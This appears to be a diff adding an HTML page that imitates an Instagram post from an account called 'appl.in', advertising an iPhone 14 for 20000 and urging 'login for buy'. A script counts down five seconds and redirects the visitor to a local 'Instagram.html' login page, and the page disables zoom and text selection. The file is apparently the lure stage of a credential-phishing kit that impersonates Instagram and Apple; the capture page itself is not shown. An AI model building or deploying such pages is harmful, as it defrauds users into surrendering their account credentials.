@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Iphon 14 only 20000/- </title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #000;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            touch-action: manipulation;
+            overflow: hidden;
+        }
+
+        /* Header */
+        .header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: #000;
+            border-bottom: 1px solid #262626;
+            padding: 12px 16px;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .instagram-logo {
+            font-family: 'Billabong', cursive;
+            font-size: 24px;
+            color: white;
+            text-align: center;
+            flex: 1;
+        }
+
+        .back-button {
+            color: white;
+            font-size: 18px;
+        }
+
+        /* Post Content */
+        .post-content {
+            flex: 1;
+            margin-top: 50px;
+            margin-bottom: 60px;
+            overflow-y: auto;
+        }
+
+        .post-header {
+            display: flex;
+            align-items: center;
+            padding: 12px 16px;
+            background: #000;
+        }
+
+        .profile-pic {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: #262626;
+            margin-right: 12px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid #e1306c;
+        }
+
+        .profile-pic img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 50%;
+        }
+
+        .username {
+            color: #f5f5f5;
+            font-weight: 600;
+            font-size: 14px;
+            flex: 1;
+        }
+
+        .more-options {
+            color: #f5f5f5;
+            font-size: 16px;
+        }
+
+        .post-image-container {
+            width: 100%;
+            height: 70vh;
+            background: #262626;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .post-image {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .post-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+            padding: 30px 20px 20px;
+            text-align: center;
+        }
+
+        .post-text {
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.7);
+        }
+
+        .post-details {
+            padding: 12px 16px;
+            background: #000;
+        }
+
+        .engagement-stats {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-bottom: 12px;
+        }
+
+        .likes {
+            color: #f5f5f5;
+            font-weight: 600;
+            font-size: 14px;
+        }
+
+        .view-comments {
+            color: #a8a8a8;
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+
+        .caption {
+            color: #f5f5f5;
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 4px;
+        }
+
+        .caption .username {
+            font-weight: 600;
+            margin-right: 4px;
+        }
+
+        .timestamp {
+            color: #a8a8a8;
+            font-size: 12px;
+            margin-top: 8px;
+            text-transform: uppercase;
+        }
+
+        /* Bottom Action Bar - Moved Up */
+        .bottom-actions {
+            position: fixed;
+            bottom: 10px;
+            left: 0;
+            right: 0;
+            background: #000;
+            border-top: 1px solid #262626;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .action-icons {
+            display: flex;
+            gap: 20px;
+            flex: 1;
+            justify-content: center;
+        }
+
+        .action-icon {
+            color: #f5f5f5;
+            font-size: 24px;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        .action-icon.like:hover {
+            color: #ed4956;
+        }
+
+        .action-icon.comment:hover {
+            color: #0095f6;
+        }
+
+        .action-icon.share:hover {
+            color: #0095f6;
+        }
+
+        .action-icon.save {
+            margin-left: auto;
+        }
+
+        .action-icon.save:hover {
+            color: #0095f6;
+        }
+
+        .redirect-message {
+            position: fixed;
+            bottom: 60px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 14px;
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            border: 1px solid #262626;
+        }
+
+        /* Custom font for Instagram logo */
+        @font-face {
+            font-family: 'Billabong';
+            src: url('https://fonts.cdnfonts.com/s/13949/Billabong.woff') format('woff');
+        }
+
+        /* Animation for redirect countdown */
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        .countdown {
+            animation: pulse 1s infinite;
+            font-weight: bold;
+            color: #0095f6;
+        }
+
+        /* Loading state for images */
+        .image-loading {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #8e8e8e;
+            font-size: 14px;
+            height: 100%;
+        }
+
+        /* Desktop Styles */
+        @media (min-width: 768px) {
+            body {
+                justify-content: center;
+                align-items: center;
+                padding: 20px;
+            }
+
+            .post-content {
+                max-width: 500px;
+                width: 100%;
+                margin: 0;
+                border-radius: 12px;
+                overflow: hidden;
+                box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+            }
+
+            .header {
+                display: none;
+            }
+
+            .bottom-actions {
+                display: none;
+            }
+
+            .post-actions {
+                padding: 12px 16px 8px;
+                background: #000;
+            }
+
+            .action-icons {
+                justify-content: flex-start;
+                margin-bottom: 8px;
+            }
+
+            .redirect-message {
+                bottom: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Mobile Header -->
+    <div class="header">
+        <div class="back-button">
+            <i class="fas fa-chevron-left"></i>
+        </div>
+        <div class="instagram-logo">Instagram</div>
+        <div class="more-options">
+            <i class="fas fa-ellipsis-h"></i>
+        </div>
+    </div>
+    
+    <!-- Post Content -->
+    <div class="post-content">
+        <div class="post-header">
+            <div class="profile-pic">
+                <img src="https://drive.google.com/thumbnail?id=10RpKJ1LzTW33og0oUe0C91v9FK1MvQyu&sz=w1000" 
+                     alt="Profile" 
+                     onerror="this.style.display='none'; this.parentElement.innerHTML='<i class=\"fas fa-user\"></i>';">
+            </div>
+            <div class="username">appl.in</div>
+            <div class="more-options">
+                <i class="fas fa-ellipsis-h"></i>
+            </div>
+        </div>
+        
+        <div class="post-image-container">
+            <img src="https://drive.google.com/thumbnail?id=1pzxFOJVSARqh4pZ5cTqd_LmYgqQx4yIf&sz=w1000" 
+                 alt="Post" 
+                 class="post-image"
+                 onerror="this.style.display='none'; this.parentElement.innerHTML='<div class=\"image-loading\"><i class=\"fas fa-image\"></i> Image not available</div>';">
+            <div class="post-overlay">
+                <div class="post-text">20000/- login for buy</div>
+            </div>
+        </div>
+        
+        <div class="post-details">
+            <div class="engagement-stats">
+                <div class="likes"></div>
+                <div class="view-comments"></div>
+            </div>
+            
+            <div class="caption">
+                <span class="username">appl.in</span> 20000/- login for buy appl.in user name
+            </div>
+            <div class="timestamp">2 hours ago</div>
+        </div>
+    </div>
+    
+    <!-- Mobile Bottom Action Bar - Moved Up -->
+    <div class="bottom-actions">
+        <div class="action-icons">
+            <div class="action-icon like">
+                <i class="far fa-heart"></i>
+            </div>
+            <div class="action-icon comment">
+                <i class="far fa-comment"></i>
+            </div>
+            <div class="action-icon share">
+                <i class="far fa-paper-plane"></i>
+            </div>
+            <div class="action-icon save">
+                <i class="far fa-bookmark"></i>
+            </div>
+        </div>
+    </div>
+    
+    <div class="redirect-message">
+        Redirecting to login in <span id="countdown" class="countdown">5</span> seconds...
+    </div>
+
+    <script>
+        let seconds = 5;
+        const countdownElement = document.getElementById('countdown');
+        
+        // Add interactivity to action buttons
+        document.querySelectorAll('.action-icon').forEach(icon => {
+            icon.addEventListener('click', function() {
+                if (this.classList.contains('like')) {
+                    const heartIcon = this.querySelector('i');
+                    if (heartIcon.classList.contains('far')) {
+                        heartIcon.classList.remove('far');
+                        heartIcon.classList.add('fas');
+                        heartIcon.style.color = '#ed4956';
+                    } else {
+                        heartIcon.classList.remove('fas');
+                        heartIcon.classList.add('far');
+                        heartIcon.style.color = '';
+                    }
+                } else if (this.classList.contains('save')) {
+                    const bookmarkIcon = this.querySelector('i');
+                    if (bookmarkIcon.classList.contains('far')) {
+                        bookmarkIcon.classList.remove('far');
+                        bookmarkIcon.classList.add('fas');
+                        bookmarkIcon.style.color = '#0095f6';
+                    } else {
+                        bookmarkIcon.classList.remove('fas');
+                        bookmarkIcon.classList.add('far');
+                        bookmarkIcon.style.color = '';
+                    }
+                }
+            });
+        });
+        
+        // Update countdown every second
+        const countdownInterval = setInterval(function() {
+            seconds--;
+            countdownElement.textContent = seconds;
+            
+            if (seconds <= 0) {
+                clearInterval(countdownInterval);
+                // Redirect to login page
+                window.location.href = 'Instagram.html';
+            }
+        }, 1000);
+        
+        // Disable zooming
+        document.addEventListener('gesturestart', function(e) {
+            e.preventDefault();
+        });
+        
+        document.addEventListener('touchmove', function(e) {
+            if (e.scale !== 1) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+    </script>
+</body>
+</html>
